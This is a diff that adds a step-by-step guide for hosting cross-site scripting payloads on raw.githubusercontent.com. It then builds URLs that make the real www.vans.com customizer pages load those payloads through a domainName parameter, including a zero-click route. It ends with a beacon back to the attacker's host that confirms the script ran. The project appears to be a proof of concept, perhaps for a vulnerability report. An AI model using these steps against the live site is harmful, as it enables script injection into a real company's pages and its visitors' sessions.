@@ -1,0 +1,125 @@
+================================================================================
+PUSH THIS REPO TO GITHUB  ->  get a raw.githubusercontent.com base URL
+================================================================================
+
+Everything is already committed locally (branch: main). The ONLY things left are:
+  (0) create an empty GitHub repo (no README, no .gitignore)
+  (1) pick user/repo/branch, run tools/setbase.sh, commit
+  (2) set a git identity (currently UNSET on this box)
+  (3) add the remote and push
+  (4) verify the raw base with verify.sh
+
+Suggested repo name:  vans-xss-poc
+Suggested branch:     main
+The operator's GitHub user is unknown to us; substitute YOUR username below.
+
+--------------------------------------------------------------------------------
+STEP 0 - create the empty repo on GitHub
+--------------------------------------------------------------------------------
+Web UI: github.com -> New repository -> name: vans-xss-poc -> Public -> DO NOT
+add README/.gitignore/license -> Create repository.
+
+--------------------------------------------------------------------------------
+STEP 1 - set the base and commit  (run from the repo dir)
+--------------------------------------------------------------------------------
+cd /home/amnotacat/vans-xss-github
+
+# replace <user> with your GitHub username (branch is usually main):
+./tools/setbase.sh https://raw.githubusercontent.com/<user>/vans-xss-poc/main
+
+git add -A
+git commit -m "set attacker base to raw.githubusercontent.com/<user>/vans-xss-poc/main"
+
+--------------------------------------------------------------------------------
+STEP 2 - git identity (unset on this machine; pick any identity you want)
+--------------------------------------------------------------------------------
+git config --global user.name  "Your Name"
+git config --global user.email "you@example.com"
+# (or scope it to this repo only: drop --global while inside the repo dir)
+
+================================================================================
+STEP 3 - PUSH.  Choose ONE of the two auth methods below.
+================================================================================
+
+------------------------------ (a) HTTPS + Personal Access Token ----------------
+Create a token: github.com -> Settings -> Developer settings ->
+Personal access tokens -> Fine-grained tokens (or classic with 'repo' scope).
+Give it Contents: Read and write for the vans-xss-poc repository.
+
+cd /home/amnotacat/vans-xss-github
+git remote add origin https://github.com/<user>/vans-xss-poc.git
+git push -u origin main
+# when prompted:
+#   Username: <user>
+#   Password: <paste the Personal Access Token>        <- NOT your account password
+
+# Optional: cache it so you only paste once
+#   git config --global credential.helper store
+
+------------------------------ (b) SSH KEY  ------------------------------------
+# This box currently has NO ssh key, so create one first:
+ssh-keygen -t ed25519 -C "you@example.com" -f ~/.ssh/id_ed25519 -N ""
+cat ~/.ssh/id_ed25519.pub
+# -> copy that output into github.com -> Settings -> SSH and GPG keys -> New SSH key
+
+# smoke test the key:
+ssh -T git@github.com          # expect: "Hi <user>! You've successfully authenticated"
+
+cd /home/amnotacat/vans-xss-github
+git remote add origin git@github.com:<user>/vans-xss-poc.git
+git push -u origin main
+
+================================================================================
+STEP 4 - BUILD THE VERIFY URL AND VERIFY
+================================================================================
+
+BASE URL PATTERN (this is what goes in ?domainName=):
+
+    https://raw.githubusercontent.com/<user>/vans-xss-poc/main
+
+Example (user nope8824):
+
+    https://raw.githubusercontent.com/nope8824/vans-xss-poc/main
+
+Run the package verifier against the PUBLIC raw base (asserts HTTP 200 +
+Access-Control-Allow-Origin: * + inline onerror/alert + beacon for every path):
+
+    /home/amnotacat/Desktop/vans-xss-poc/verify.sh https://raw.githubusercontent.com/<user>/vans-xss-poc/main
+
+Quick manual spot-check (must show "access-control-allow-origin: *"):
+
+    curl -sS -D - -o /dev/null \
+      https://raw.githubusercontent.com/<user>/vans-xss-poc/main/vfdp-customs-prod-pdm/configurations/nora-en-us-sfcc/configuration.json
+
+--------------------------------------------------------------------------------
+STEP 5 - DELIVER (browser)
+--------------------------------------------------------------------------------
+BASE=https://raw.githubusercontent.com/<user>/vans-xss-poc/main
+
+# 0-click (UGC icons) :
+echo "https://www.vans.com/vfdp-customs-toolkit-prod/index.html?loadUGC=true&domainName=$BASE"
+
+# nora caid route:
+echo "https://www.vans.com/vfdp-customizer-nora-prod/index.html?caid=nora-en-us-sfcc-canvas&domainName=$BASE"
+
+# parent product page:
+echo "https://www.vans.com/en-us/customizer/ultrarange-exo?domainName=$BASE"
+
+Open one of those in a browser: expect the red "XSS EXECUTED on www.vans.com"
+banner, alert('XSS on www.vans.com'), __XSS_FIRED === true, and a Network request
+for $BASE/fired?d=www.vans.com&s=<sink>.
+
+--------------------------------------------------------------------------------
+NOTES / GOTCHAS
+--------------------------------------------------------------------------------
+* raw.githubusercontent.com sends Acecss-Control-Allow-Origin: * -> the app's
+  cross-origin fetch works. It also sends Content-Type: text/plain for .json/.svg,
+  which is FINE: the app fetches the body as text and JSON.parse()s / innerHTMLs
+  it (it does not rely on Content-Type).
+* If you edit a payload later, remember the jsdelivr/raw CDN caches. raw.github-
+  usercontent.com is effectively uncached per-branch; if you use jsdelivr bump
+  the @ref (e.g. @main -> @<commit-sha>).
+* Do NOT commit base.txt / logs (already in .gitignore).
+* Re-running tools/setbase.sh with a different user/repo/branch rewrites every
+  URL in the tree and is safe to repeat.
+================================================================================
